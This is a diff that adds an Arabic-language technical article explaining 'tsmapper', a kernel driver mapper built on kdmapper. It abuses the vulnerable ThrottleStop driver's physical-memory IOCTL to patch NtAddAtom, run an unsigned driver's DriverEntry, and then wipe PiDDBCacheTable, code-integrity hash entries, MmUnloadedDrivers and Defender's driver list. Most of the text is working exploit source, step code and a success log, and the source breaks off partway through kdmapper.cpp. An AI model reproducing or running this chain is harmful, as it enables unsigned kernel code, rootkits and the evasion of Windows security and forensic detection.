+<rect x="270" y="470" width="195" height="140" rx="8" fill="#0f172a" stroke="#f59e0b" stroke-opacity=".45"/>
+<text x="367" y="495" fill="#fbbf24" font-family="JetBrains Mono, monospace" font-size="11" font-weight="700" text-anchor="middle">PATCH</text>
+<text x="367" y="519" fill="#cbd5e1" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">mov rax, target</text>
+<text x="367" y="538" fill="#cbd5e1" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">jmp rax</text>
+<text x="367" y="560" fill="#94a3b8" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">WritePhysicalBuffer</text>
+<text x="367" y="582" fill="#fbbf24" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">IOCTL 0x8000649C</text>
+
+<rect x="480" y="470" width="195" height="140" rx="8" fill="#0f172a" stroke="#8b5cf6" stroke-opacity=".45"/>
+<text x="577" y="495" fill="#c4b5fd" font-family="JetBrains Mono, monospace" font-size="11" font-weight="700" text-anchor="middle">CALL</text>
+<text x="577" y="519" fill="#cbd5e1" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">ntdll!NtAddAtom(args)</text>
+<text x="577" y="538" fill="#c4b5fd" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">syscall → nt!NtAddAtom</text>
+<text x="577" y="560" fill="#cbd5e1" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">jmp rax → target</text>
+<text x="577" y="582" fill="#64748b" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">args + status pass through</text>
+
+<rect x="690" y="470" width="195" height="140" rx="8" fill="#0f172a" stroke="#ef4444" stroke-opacity=".45"/>
+<text x="787" y="495" fill="#fca5a5" font-family="JetBrains Mono, monospace" font-size="11" font-weight="700" text-anchor="middle">RESTORE</text>
+<text x="787" y="519" fill="#cbd5e1" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">WritePhysicalBuffer</text>
+<text x="787" y="538" fill="#cbd5e1" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">original[16]</text>
+<text x="787" y="560" fill="#94a3b8" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">ReadPhysicalBuffer</text>
+<text x="787" y="582" fill="#fca5a5" font-family="JetBrains Mono, monospace" font-size="9.5" text-anchor="middle">IOCTL 0x8000649C + memcmp</text>
+
+<line x1="255" y1="540" x2="266" y2="540" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig2ar-arrow)"/>
+<line x1="465" y1="540" x2="476" y2="540" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig2ar-arrow)"/>
+<line x1="675" y1="540" x2="686" y2="540" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig2ar-arrow)"/>
+<text x="480" y="634" fill="#64748b" font-family="Inter, sans-serif" font-size="9.5" text-anchor="middle">The gate is installed for one call and restored immediately; the original 16 bytes are verified after restore.</text>
+
+<rect x="40" y="672" width="880" height="80" rx="9" fill="#111827" stroke="#10b981" stroke-opacity=".55"/>
+<text x="60" y="696" fill="#6ee7b7" font-family="JetBrains Mono, monospace" font-size="12" font-weight="700">KERNEL TARGETS</text>
+<rect x="60" y="708" width="260" height="28" rx="6" fill="#0f172a" stroke="#10b981" stroke-opacity=".35"/>
+<text x="190" y="727" fill="#e2e8f0" font-family="JetBrains Mono, monospace" font-size="10" text-anchor="middle">ExAllocatePoolWithTag</text>
+<rect x="340" y="708" width="260" height="28" rx="6" fill="#0f172a" stroke="#10b981" stroke-opacity=".35"/>
+<text x="470" y="727" fill="#e2e8f0" font-family="JetBrains Mono, monospace" font-size="10" text-anchor="middle">MmGetPhysicalAddress</text>
+<rect x="620" y="708" width="280" height="28" rx="6" fill="#0f172a" stroke="#10b981" stroke-opacity=".35"/>
+<text x="760" y="727" fill="#e2e8f0" font-family="JetBrains Mono, monospace" font-size="10" text-anchor="middle">DriverEntry</text>
+
+<rect x="200" y="772" width="560" height="60" rx="9" fill="#111827" stroke="#ef4444" stroke-opacity=".55"/>
+<text x="480" y="796" fill="#fca5a5" font-family="JetBrains Mono, monospace" font-size="12" font-weight="700" text-anchor="middle">kdriver.sys</text>
+<text x="480" y="816" fill="#8892a4" font-family="Inter, sans-serif" font-size="10" text-anchor="middle">mapped driver · device + IOCTL surface stays resident</text>
+
+<rect x="200" y="852" width="560" height="60" rx="9" fill="#111827" stroke="#64748b" stroke-opacity=".55"/>
+<text x="480" y="876" fill="#cbd5e1" font-family="JetBrains Mono, monospace" font-size="12" font-weight="700" text-anchor="middle">CLEANUP</text>
+<text x="480" y="896" fill="#8892a4" font-family="Inter, sans-serif" font-size="10" text-anchor="middle">PiDDBCacheTable / KernelHashBucketList / MmUnloadedDrivers / WdFilterDriverList + unload</text>
+
+<line x1="710" y1="146" x2="710" y2="160" stroke="#94a3b8" stroke-width="1.5"/>
+<line x1="255" y1="160" x2="705" y2="160" stroke="#94a3b8" stroke-width="1.5"/>
+<line x1="255" y1="160" x2="255" y2="174" stroke="#94a3b8" stroke-width="1.5" marker-end="url(#fig2ar-arrow)"/>
+<line x1="705" y1="160" x2="705" y2="174" stroke="#94a3b8" stroke-width="1.5" marker-end="url(#fig2ar-arrow)"/>
+<line x1="255" y1="283" x2="255" y2="300" stroke="#94a3b8" stroke-width="1.5"/>
+<line x1="705" y1="283" x2="705" y2="300" stroke="#94a3b8" stroke-width="1.5"/>
+<line x1="255" y1="300" x2="705" y2="300" stroke="#94a3b8" stroke-width="1.5"/>
+<line x1="480" y1="300" x2="480" y2="312" stroke="#94a3b8" stroke-width="1.5" marker-end="url(#fig2ar-arrow)"/>
+<line x1="480" y1="380" x2="480" y2="405" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig2ar-arrow)"/>
+<line x1="480" y1="650" x2="480" y2="667" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig2ar-arrow)"/>
+<line x1="480" y1="752" x2="480" y2="767" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig2ar-arrow)"/>
+<line x1="480" y1="832" x2="480" y2="847" stroke="#64748b" stroke-width="1.5" marker-end="url(#fig2ar-arrow)"/>
+<text x="480" y="946" fill="#64748b" font-family="Inter, sans-serif" font-size="10" text-anchor="middle">Only the vulnerable bootstrap is removed; the mapped driver keeps its device and IOCTL surface.</text>
+</svg>
+<figcaption><strong>Figure 2.</strong> الـ full chain: user mode، ThrottleStop، الـ IOCTLين، physical memory، call gate، target، وبعدها kdriver.sys.</figcaption>
+</figure>
+
+<h3>الخطوة 1: Kernel Base + NtAddAtom</h3>
+<p>نجيب قاعدة <code>ntoskrnl</code> من قائمة الموديولات، ونحسب VA حق <code>NtAddAtom</code></p>
+<pre><code>ntoskrnlAddr = kdmUtils::GetKernelModuleAddress(&quot;ntoskrnl.exe&quot;);
+uint64_t ntAddAtomOffset = GetLocalExportOffset(&quot;NtAddAtom&quot;);
+uint64_t vaNtAddAtom = ntoskrnlAddr + ntAddAtomOffset;</code></pre>
+<h3>الخطوة 2: VA → PA</h3>
+<p>نبني Superfetch map مرة وحدة، ونترجم <code>NtAddAtom</code> من VA إلى PA.</p>
+<pre><code>auto translation_map = superfetch::BuildTranslationMap();
+paNtAddAtom = superfetch::Translate(translation_map, vaNtAddAtom);</code></pre>
+<h3>الخطوة 3: Call Gate</h3>
+<p>داخل <code>CallKernelFunction</code>: نحفظ 16 بايت، نكتب الـ stub، ننادي الدالة، وبعدها نرجع البايتات الأصلية.</p>
+<pre><code>uint8_t kernel_injected_jmp[16] = {
+    0x48, 0xb8, 0, 0, 0, 0, 0, 0,
+    0, 0, 0xff, 0xe0, 0, 0, 0, 0
+};
+uint8_t original_kernel_function[16];
+*(uint64_t*)&amp;kernel_injected_jmp[2] = kernel_function_address;
+
+ReadPhysicalBuffer(paNtAddAtom, &amp;original_kernel_function,
+                   sizeof(kernel_injected_jmp));
+memcpy(&amp;kernel_injected_jmp[12], &amp;original_kernel_function[12], 4);
+WritePhysicalBuffer(paNtAddAtom, &amp;kernel_injected_jmp,
+                    sizeof(kernel_injected_jmp));
+
+if constexpr (!call_void) {
+    using FunctionFn = T(__stdcall*)(A...);
+    const auto Function = reinterpret_cast&lt;FunctionFn&gt;(NtAddAtom);
+    *out_result = Function(arguments...);
+} else {
+    using FunctionFn = void(__stdcall*)(A...);
+    const auto Function = reinterpret_cast&lt;FunctionFn&gt;(NtAddAtom);
+    Function(arguments...);
+}
+
+WritePhysicalBuffer(paNtAddAtom, original_kernel_function,
+                    sizeof(kernel_injected_jmp));</code></pre>
+<h3>الخطوة 4: Mapping</h3>
+<p>داخل <code>MapDriver</code>: نختار pool أو independent pages، نحسب entry point، وننادي <code>DriverEntry</code>.</p>
+<pre><code>ULONG64 kernel_image_base = 0;
+if (mode == AllocationMode::AllocateIndependentPages)
+    kernel_image_base = ts_driver::MmAllocateIndependentPagesEx(image_size);
+else
+    kernel_image_base = ts_driver::AllocatePool(
+        nt::POOL_TYPE::NonPagedPool, image_size);
+
+const ULONG64 address_of_entry_point =
+    kernel_image_base + nt_headers-&gt;OptionalHeader.AddressOfEntryPoint;
+
+NTSTATUS status = 0;
+ts_driver::CallKernelFunction(&amp;status, address_of_entry_point,
+    (PassAllocationAddressAsFirstParam ? realBase : param1), param2);</code></pre>
+<h3>الخطوة 5: Cleanup</h3>
+<p>نحذف آثار التحميل من الكاشات، وبعدها نعمل unload للـ ThrottleStop.</p>
+<pre><code>ts_driver::ClearPiDDBCacheTable();
+ts_driver::ClearKernelHashBucketList();
+ts_driver::ClearMmUnloadedDrivers();
+ts_driver::ClearWdFilterDriverList();
+ts_driver::Unload();</code></pre>
+
+<h2>4. إزالة الآثار</h2>
+<ul>
+<li><strong><code>PiDDBCacheTable</code></strong> — حذف الدرايفر من الدرايفر لست</li>
+<li><strong><code>g_KernelHashBucketList</code></strong> — حذف code-integrity hash entry داخل <code>ci.dll</code>.</li>
+<li><strong><code>MmUnloadedDrivers</code></strong> — تنظيف unloaded-driver history entry.</li>
+<li><strong><code>WdFilterDriverList</code></strong> — حذف Defender driver-list entry.</li>
+<li><strong>Service والملف</strong> — يوقف السيرفس، يكتب فوق ملف <code>.sys</code> المؤقت، ويحذفه.</li>
+</ul>
+<h2>5. النتيجة</h2>
+<pre><code>[&lt;] Loading ThrottleStop.sys
+[+] NtLoadDriver Status 0x0
+[+] ThrottleStop physical R/W working
+[+] ntoskrnl.exe base: 0xfffff...
+[+] Superfetch map: 866551 pages
+[+] NtAddAtom first bytes: 48 83 ec 28
+[+] ntoskrnl MZ header verified
+[+] PiDDBCacheTable Cleaned
+[+] g_KernelHashBucketList Cleaned
+[+] MmUnloadedDrivers Cleaned
+[+] DriverEntry returned 0x0
+[&lt;] Unloading ThrottleStop driver
+[+] success</code></pre>
+<h2>6. سورس tsmapper</h2>
+<div class="source-files">
+<h3>main.cpp</h3>
+<pre><code>#ifndef KDLIBMODE
+
+#include &lt;Windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;vector&gt;
+#include &lt;filesystem&gt;
+#include &lt;TlHelp32.h&gt;
+
+#include &quot;kdmapper.hpp&quot;
+#include &quot;utils.hpp&quot;
+#include &quot;ts_driver.hpp&quot;
+
+#ifdef PDB_OFFSETS
+#include &quot;KDSymbolsHandler.h&quot;
+#endif
+
+LONG WINAPI SimplestCrashHandler(EXCEPTION_POINTERS* ExceptionInfo)
+{
+	if (ExceptionInfo &amp;&amp; ExceptionInfo-&gt;ExceptionRecord)
+		kdmLog(L&quot;[!!] Crash at addr 0x&quot; &lt;&lt; ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress &lt;&lt; L&quot; by 0x&quot; &lt;&lt; std::hex &lt;&lt; ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode &lt;&lt; std::endl);
+	else
+		kdmLog(L&quot;[!!] Crash&quot; &lt;&lt; std::endl);
+
+	if (ts_driver::hDevice)
+		ts_driver::Unload();
+
+	return EXCEPTION_EXECUTE_HANDLER;
+}
+
+int paramExists(const int argc, wchar_t** argv, const wchar_t* param) {
+	size_t plen = wcslen(param);
+	for (int i = 1; i &lt; argc; i++) {
+		if (wcslen(argv[i]) == plen + 1ull &amp;&amp; _wcsicmp(&amp;argv[i][1], param) == 0 &amp;&amp; argv[i][0] == &#x27;/&#x27;) { // with slash
+			return i;
+		}
+		else if (wcslen(argv[i]) == plen + 2ull &amp;&amp; _wcsicmp(&amp;argv[i][2], param) == 0 &amp;&amp; argv[i][0] == &#x27;-&#x27; &amp;&amp; argv[i][1] == &#x27;-&#x27;) { // with double dash
+			return i;
+		}
+	}
+	return -1;
+}
+
+bool callbackExample(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, ULONG64 allocationSize) {
+	UNREFERENCED_PARAMETER(param1);
+	UNREFERENCED_PARAMETER(param2);
+	UNREFERENCED_PARAMETER(allocationPtr);
+	UNREFERENCED_PARAMETER(allocationSize);
+	kdmLog(&quot;[+] Callback example called&quot; &lt;&lt; std::endl);
+	
+	/*
+	This callback occurs before call driver entry and
+	can be useful to pass more customized params in 
+	the last step of the mapping procedure since you 
+	know now the mapping address and other things
+	*/
+	return true;
+}
+
+DWORD getParentProcess()
+{
+	HANDLE hSnapshot;
+	PROCESSENTRY32 pe32;
+	DWORD ppid = 0, pid = GetCurrentProcessId();
+
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	__try {
+		if (hSnapshot == INVALID_HANDLE_VALUE || hSnapshot == 0) __leave;
+
+		ZeroMemory(&amp;pe32, sizeof(pe32));
+		pe32.dwSize = sizeof(pe32);
+		if (!Process32First(hSnapshot, &amp;pe32)) __leave;
+
+		do {
+			if (pe32.th32ProcessID == pid) {
+				ppid = pe32.th32ParentProcessID;
+				break;
+			}
+		} while (Process32Next(hSnapshot, &amp;pe32));
+
+	}
+	__finally {
+		if (hSnapshot != INVALID_HANDLE_VALUE &amp;&amp; hSnapshot != 0) CloseHandle(hSnapshot);
+	}
+	return ppid;
+}
+
+//Help people that don&#x27;t understand how to open a console
+void PauseIfParentIsExplorer() {
+	DWORD explorerPid = 0;
+	GetWindowThreadProcessId(GetShellWindow(), &amp;explorerPid);
+	DWORD parentPid = getParentProcess();
+	if (parentPid == explorerPid) {
+		kdmLog(L&quot;[+] Pausing to allow for debugging&quot; &lt;&lt; std::endl);
+		kdmLog(L&quot;[+] Press enter to close&quot; &lt;&lt; std::endl);
+		std::cin.get();
+	}
+}
+
+void help() {
+	kdmLog(L&quot;\r\n\r\n[!] Incorrect Usage!&quot; &lt;&lt; std::endl);
+	kdmLog(L&quot;[+] Usage: kdmapper.exe [--free][--indPages][--PassAllocationPtr][--copy-header]&quot;);
+
+#ifdef PDB_OFFSETS
+	kdmLog(L&quot;[--dontUpdateOffsets [--offsetsPath \&quot;FilePath\&quot;]]&quot;); 
+#endif
+	
+	kdmLog(L&quot; driver&quot; &lt;&lt; std::endl);
+
+	PauseIfParentIsExplorer();
+}
+
+int wmain(const int argc, wchar_t** argv) {
+	SetUnhandledExceptionFilter(SimplestCrashHandler);
+
+	bool free = paramExists(argc, argv, L&quot;free&quot;) &gt; 0;
+	bool indPagesMode = paramExists(argc, argv, L&quot;indPages&quot;) &gt; 0;
+	bool passAllocationPtr = paramExists(argc, argv, L&quot;PassAllocationPtr&quot;) &gt; 0;
+	bool copyHeader = paramExists(argc, argv, L&quot;copy-header&quot;) &gt; 0;
+
+	if (free) {
+		kdmLog(L&quot;[+] Free memory after driver execution enabled&quot; &lt;&lt; std::endl);
+	}
+
+	if (indPagesMode) {
+		kdmLog(L&quot;[+] Allocate Independent Pages mode enabled&quot; &lt;&lt; std::endl);
+	}
+
+	if (passAllocationPtr) {
+		kdmLog(L&quot;[+] Pass Allocation Ptr as first param enabled&quot; &lt;&lt; std::endl);
+	}
+
+	if (copyHeader) {
+		kdmLog(L&quot;[+] Copying driver header enabled&quot; &lt;&lt; std::endl);
+	}
+
+#ifdef PDB_OFFSETS
+	bool UpdateOffset = !(paramExists(argc, argv, L&quot;dontUpdateOffsets&quot;) &gt; 0);
+	int FilePathParamIdx = paramExists(argc, argv, L&quot;offsetsPath&quot;);
+	std::wstring offsetFilePath = kdmUtils::GetCurrentAppFolder() + L&quot;\\offsets.ini&quot;;
+
+	if (UpdateOffset &amp;&amp; FilePathParamIdx &gt; 0) {
+		kdmLog(&quot;[-] Can&#x27;t set --offsetsPath without set --dontUpdateOffsets&quot; &lt;&lt; std::endl);
+		help();
+		return -1;
+	}
+
+	if (FilePathParamIdx &gt; 0) {
+		offsetFilePath = argv[FilePathParamIdx + 1];
+		kdmLog(&quot;[+] Setting Offsets File Path To: &quot; &lt;&lt; offsetFilePath &lt;&lt; std::endl);
+	}
+#endif
+
+	int drvIndex = -1;
+	for (int i = 1; i &lt; argc; i++) {
+		if (std::filesystem::path(argv[i]).extension().string().compare(&quot;.sys&quot;) == 0) {
+			drvIndex = i;
+			break;
+		}
+	}
+
+	if (drvIndex &lt;= 0) {
+		help();
+		return -1;
+	}
+
+	const std::wstring driver_path = argv[drvIndex];
+
+	if (!std::filesystem::exists(driver_path)) {
+		kdmLog(L&quot;[-] File &quot; &lt;&lt; driver_path &lt;&lt; L&quot; doesn&#x27;t exist&quot; &lt;&lt; std::endl);
+		PauseIfParentIsExplorer();
+		return -1;
+	}
+
+#ifdef PDB_OFFSETS
+	if (!KDSymbolsHandler::GetInstance()-&gt;ReloadFile(offsetFilePath, UpdateOffset ? kdmUtils::GetCurrentAppFolder() + L&quot;\\&quot; + SYM_FROM_PDB_EXE : L&quot;&quot;)) {
+		kdmLog(L&quot;[-] Error: Failed To Get Symbols Info.&quot; &lt;&lt; std::endl);
+		PauseIfParentIsExplorer();
+		return -1;
+	}
+#endif
+
+	if (!NT_SUCCESS(ts_driver::Load())) {
+		PauseIfParentIsExplorer();
+		return -1;
+	}
+
+	std::vector&lt;uint8_t&gt; raw_image = { 0 };
+	if (!kdmUtils::ReadFileToMemory(driver_path, &amp;raw_image)) {
+		kdmLog(L&quot;[-] Failed to read image to memory&quot; &lt;&lt; std::endl);
+		ts_driver::Unload();
+		PauseIfParentIsExplorer();
+		return -1;
+	}
+
+	kdmapper::AllocationMode mode = kdmapper::AllocationMode::AllocatePool;
+
+	if (indPagesMode) {
+		mode = kdmapper::AllocationMode::AllocateIndependentPages;
+	}
+
+	NTSTATUS exitCode = 0;
+	if (!kdmapper::MapDriver(raw_image.data(), 0, 0, free, !copyHeader, mode, passAllocationPtr, callbackExample, &amp;exitCode)) {
+		kdmLog(L&quot;[-] Failed to map &quot; &lt;&lt; driver_path &lt;&lt; std::endl);
+		ts_driver::Unload();
+		PauseIfParentIsExplorer();
+		return -1;
+	}
+
+	if (!NT_SUCCESS(ts_driver::Unload())) {
+		kdmLog(L&quot;[-] Warning failed to fully unload vulnerable driver &quot; &lt;&lt; std::endl);
+		PauseIfParentIsExplorer();
+	}
+	kdmLog(L&quot;[+] success&quot; &lt;&lt; std::endl);
+
+}
+
+#endif</code></pre>
+<h3>include/kdmapper.hpp</h3>
+<pre><code>#pragma once
+
+#include &lt;Windows.h&gt;
+
+namespace kdmapper
+{
+	enum class AllocationMode
+	{
+		AllocatePool,
+		AllocateIndependentPages
+	};
+
+	typedef bool (*mapCallback)(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, ULONG64 allocationSize);
+
+	//Note: if you set PassAllocationAddressAsFirstParam as true, param1 will be ignored
+	ULONG64 MapDriver(BYTE* data, ULONG64 param1 = 0, ULONG64 param2 = 0, bool free = false, bool destroyHeader = true, AllocationMode mode = AllocationMode::AllocatePool, bool PassAllocationAddressAsFirstParam = false, mapCallback callback = nullptr, NTSTATUS* exitCode = nullptr);
+}</code></pre>
+<h3>kdmapper.cpp</h3>
+<pre><code>#include &quot;kdmapper.hpp&quot;
+#include &lt;Windows.h&gt;
+#include &lt;iostream&gt;
+
+#include &quot;utils.hpp&quot;
+#include &quot;ts_driver.hpp&quot;
+#include &quot;nt.hpp&quot;
+#include &quot;portable_executable.hpp&quot;
+
+void RelocateImageByDelta(portable_executable::vec_relocs relocs, const ULONG64 delta) {
+	for (const auto&amp; current_reloc : relocs) {
+		for (auto i = 0u; i &lt; current_reloc.count; ++i) {
+			const uint16_t type = current_reloc.item[i] &gt;&gt; 12;
+			const uint16_t offset = current_reloc.item[i] &amp; 0xFFF;
+
+			if (type == IMAGE_REL_BASED_DIR64)
+				*reinterpret_cast&lt;ULONG64*&gt;(current_reloc.address + offset) += delta;
+		}
+	}
+}
+
+// Fix cookie by @Jerem584
+bool FixSecurityCookie(void* local_image, ULONG64 kernel_image_base)
+{
+	auto headers = portable_executable::GetNtHeaders(local_image);
+	if (!headers)
+		return false;
+
+	auto load_config_directory = headers-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
+	if (!load_config_directory)
+	{
+		kdmLog(L&quot;[+] Load config directory wasn&#x27;t found, probably StackCookie not defined, fix cookie skipped&quot; &lt;&lt; std::endl);
+		return true;
+	}
+
+	auto load_config_struct = (PIMAGE_LOAD_CONFIG_DIRECTORY)((uintptr_t)local_image + load_config_directory);
+	auto stack_cookie = load_config_struct-&gt;SecurityCookie;
+	if (!stack_cookie)
+	{
+		kdmLog(L&quot;[+] StackCookie not defined, fix cookie skipped&quot; &lt;&lt; std::endl);
+		return true; // as I said, it is not an error and we should allow that behavior
+	}
+
+	stack_cookie = stack_cookie - (uintptr_t)kernel_image_base + (uintptr_t)local_image; //since our local image is already relocated the base returned will be kernel address
+
+	if (*(uintptr_t*)(stack_cookie) != 0x2B992DDFA232) {
+		kdmLog(L&quot;[-] StackCookie already fixed!? this probably wrong&quot; &lt;&lt; std::endl);
+		return false;
+	}
+
+	kdmLog(L&quot;[+] Fixing stack cookie&quot; &lt;&lt; std::endl);
+
+	auto new_cookie = 0x2B992DDFA232 ^ GetCurrentProcessId() ^ GetCurrentThreadId(); // here we don&#x27;t really care about the value of stack cookie, it will still works and produce nice result
+	if (new_cookie == 0x2B992DDFA232)
+		new_cookie = 0x2B992DDFA233;
+
+	*(uintptr_t*)(stack_cookie) = new_cookie; // the _security_cookie_complement will be init by the driver itself if they use crt
+	return true;
+}
+
+bool ResolveImports(portable_executable::vec_imports imports) {
+	for (const auto&amp; current_import : imports) {
+		ULONG64 Module = kdmUtils::GetKernelModuleAddress(current_import.module_name);
+		if (!Module) {
+#if !defined(DISABLE_OUTPUT)
+			std::cout &lt;&lt; &quot;[-] Dependency &quot; &lt;&lt; current_import.module_name &lt;&lt; &quot; wasn&#x27;t found&quot; &lt;&lt; std::endl;
+#endif
+			return false;
+		}
+
+		for (auto&amp; current_function_data : current_import.function_datas) {
+			ULONG64 function_address = ts_driver::GetKernelModuleExport(Module, current_function_data.name);
+
+			if (!function_address) {
+				//Lets try with ntoskrnl
+				if (Module != ts_driver::ntoskrnlAddr) {
+					function_address = ts_driver::GetKernelModuleExport(ts_driver::ntoskrnlAddr, current_function_data.name);
+					if (!function_address) {
+#if !defined(DISABLE_OUTPUT)
+						std::cout &lt;&lt; &quot;[-] Failed to resolve import &quot; &lt;&lt; current_function_data.name &lt;&lt; &quot; (&quot; &lt;&lt; current_import.module_name &lt;&lt; &quot;)&quot; &lt;&lt; std::endl;
+#endif
+						return false;
+					}
+				}
+			}
+
+			*current_function_data.address = function_address;
+		}
+	}
+
+	return true;
+}
+
+ULONG64 kdmapper::MapDriver(BYTE* data, ULONG64 param1, ULONG64 param2, bool free, bool destroyHeader, AllocationMode mode, bool PassAllocationAddressAsFirstParam, mapCallback callback, NTSTATUS* exitCode) {
+
+	const PIMAGE_NT_HEADERS64 nt_headers = portable_executable::GetNtHeaders(data);
+
+	if (!nt_headers) {
+		kdmLog(L&quot;[-] Invalid format of PE image&quot; &lt;&lt; std::endl);
+		return 0;
+	}
+
+	if (nt_headers-&gt;OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+		kdmLog(L&quot;[-] Image is not 64 bit&quot; &lt;&lt; std::endl);
+		return 0;
+	}
+
+	ULONG32 image_size = nt_headers-&gt;OptionalHeader.SizeOfImage;
+
+	void* local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	if (!local_image_base)
+		return 0;
+
+	DWORD TotalVirtualHeaderSize = (IMAGE_FIRST_SECTION(nt_headers))-&gt;VirtualAddress;
+	image_size = image_size - (destroyHeader ? TotalVirtualHeaderSize : 0);
+
+	ULONG64 kernel_image_base = 0;
+	if (mode == AllocationMode::AllocateIndependentPages)
+	{
+		kernel_image_base = ts_driver::MmAllocateIndependentPagesEx(image_size);
+	}
+	else { // AllocatePool by default
+		kernel_image_base = ts_driver::AllocatePool(nt::POOL_TYPE::NonPagedPool, image_size);
+	}
+
+	if (!kernel_image_base) {
+		kdmLog(L&quot;[-] Failed to allocate remote image in kernel&quot; &lt;&lt; std::endl);
+
+		VirtualFree(local_image_base, 0, MEM_RELEASE);
+		return 0;
+	}
+
+	do {
+		kdmLog(L&quot;[+] Image base has been allocated at 0x&quot; &lt;&lt; reinterpret_cast&lt;void*&gt;(kernel_image_base) &lt;&lt; std::endl);
+
+		// Copy image headers
+
+		memcpy(local_image_base, data, nt_headers-&gt;OptionalHeader.SizeOfHeaders);
+
+		// Copy image sections
+
+		const PIMAGE_SECTION_HEADER current_image_section = IMAGE_FIRST_SECTION(nt_headers);
+
+		for (auto i = 0; i &lt; nt_headers-&gt;FileHeader.NumberOfSections; ++i) {
+			if ((current_image_section[i].Characteristics &amp; IMAGE_SCN_CNT_UNINITIALIZED_DATA) &gt; 0)
+				continue;
+			auto local_section = reinterpret_cast&lt;void*&gt;(reinterpret_cast&lt;ULONG64&gt;(local_image_base) + current_image_section[i].VirtualAddress);
+			memcpy(local_section, reinterpret_cast&lt;void*&gt;(reinterpret_cast&lt;ULONG64&gt;(data) + current_image_section[i].PointerToRawData), current_image_section[i].SizeOfRawData);
+		}
+
+		ULONG64 realBase = kernel_image_base;
+		if (destroyHeader) {
+			kernel_image_base -= TotalVirtualHeaderSize;
+			kdmLog(L&quot;[+] Skipped 0x&quot; &lt;&lt; std::hex &lt;&lt; TotalVirtualHeaderSize &lt;&lt; L&quot; bytes of PE Header&quot; &lt;&lt; std::endl);
+		}
+
+		// Resolve relocs and imports
+
+		RelocateImageByDelta(portable_executable::GetRelocs(local_image_base), kernel_image_base - nt_headers-&gt;OptionalHeader.ImageBase);
+
+		if (!FixSecurityCookie(local_image_base, kernel_image_base ))
+		{
+			kdmLog(L&quot;[-] Failed to fix cookie&quot; &lt;&lt; std::endl);
+			return 0;
+		}
+
+		if (!ResolveImports(portable_executable::GetImports(local_image_base))) {
+			kdmLog(L&quot;[-] Failed to resolve imports&quot; &lt;&lt; std::endl);
+			kernel_image_base = realBase;
+			break;
+		}
+
+		// Write fixed image to kernel
+
+		if (!ts_driver::WriteMemory(realBase, (PVOID)((uintptr_t)local_image_base + (destroyHeader ? TotalVirtualHeaderSize : 0)), image_size)) {
+			kdmLog(L&quot;[-] Failed to write local image to remote image&quot; &lt;&lt; std::endl);
+			kernel_image_base = realBase;
+			break;
+		}
+
+		if (mode == AllocationMode::AllocateIndependentPages)
+		{
+			auto ProtectionToString = [](ULONG prot) -&gt; const char* {
+				switch (prot)
+				{
+				case PAGE_NOACCESS: return &quot;NOACCESS&quot;;
+				case PAGE_READONLY: return &quot;READONLY&quot;;
+				case PAGE_READWRITE: return &quot;READWRITE&quot;;
+				case PAGE_EXECUTE: return &quot;EXECUTE&quot;;
+				case PAGE_EXECUTE_READ: return &quot;EXECUTE_READ&quot;;
+				case PAGE_EXECUTE_READWRITE: return &quot;EXECUTE_READWRITE&quot;;
+				default: return &quot;UNKNOWN&quot;;
+				}
+				};
+
+			for (int i = 0; i &lt; nt_headers-&gt;FileHeader.NumberOfSections; i++) {
+				auto sec = &amp;IMAGE_FIRST_SECTION(nt_headers)[i];
+				uintptr_t secAddr = kernel_image_base + sec-&gt;VirtualAddress;
+				uint32_t secSize = sec-&gt;Misc.VirtualSize;
+
+				if (secSize &lt;= 0) {
+					kdmLog(L&quot;[*] Skipping empty section: &quot; &lt;&lt; (char*)sec-&gt;Name &lt;&lt; std::endl);
+					continue;
+				}
+
+				ULONG prot = PAGE_READONLY;
+
+				if (sec-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) {
+					prot = (sec-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) ?
+						PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
+				}
+				else if (sec-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) {
+					prot = PAGE_READWRITE;
+				}
+				else if (sec-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ) {
+					prot = PAGE_READONLY;
+				}
+
+				kdmLog(L&quot;[+] Setting protection for section: &quot;
+					&lt;&lt; (char*)sec-&gt;Name
+					&lt;&lt; L&quot; Base: 0x&quot; &lt;&lt; std::hex &lt;&lt; secAddr
+					&lt;&lt; L&quot; Size: 0x&quot; &lt;&lt; secSize
+					&lt;&lt; L&quot; Prot: &quot; &lt;&lt; ProtectionToString(prot)
+					&lt;&lt; std::dec &lt;&lt; std::endl);
+
+				if (!ts_driver::MmSetPageProtection(secAddr, secSize, prot)) {
+					kdmLog(L&quot;[-] Failed to set protection for section: &quot; &lt;&lt; (char*)sec-&gt;Name &lt;&lt; std::endl);
+				}
+			}
+		}
+
+		// Call driver entry point
+
+		const ULONG64 address_of_entry_point = kernel_image_base + nt_headers-&gt;OptionalHeader.AddressOfEntryPoint;
+
